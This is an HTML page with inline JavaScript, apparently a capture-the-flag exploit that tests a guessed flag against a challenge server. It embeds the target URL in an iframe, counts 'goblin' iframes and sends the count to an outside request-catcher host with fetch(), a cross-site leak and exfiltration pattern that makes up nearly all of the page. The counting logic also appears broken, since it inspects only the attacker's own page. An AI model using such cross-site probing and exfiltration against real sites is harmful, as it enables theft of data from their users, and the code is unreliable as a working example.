<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Finder1</title>
</head>
<body>
    <h1>Flag Finder11</h1>
    <script>
        const checkFlag = async () => {
            const requestUrl = `http://war.sschall.xyz:60001/flag?flag=ahspace`; // 고정된 flag

            // iframe 생성
            const iframe = document.createElement('iframe');
            iframe.src = requestUrl;
            document.body.appendChild(iframe);

            // 잠시 대기
            await new Promise(resolve => setTimeout(resolve, 5000)); // 5초 대기

            const goblinIframes = document.querySelectorAll('iframe[id="goblin"]');
            const currentGoblinCount = goblinIframes.length;

            // goblin iframe 개수에 따라 요청 보내기
            const finalRequestUrl = `https://hxfqwbg.request.dreamhack.games?goblinCount=${currentGoblinCount}`;
            fetch(finalRequestUrl);
            console.log(`Goblin iframe count sent: ${currentGoblinCount}`);
        };

        checkFlag();
    </script>
</body>
</html>
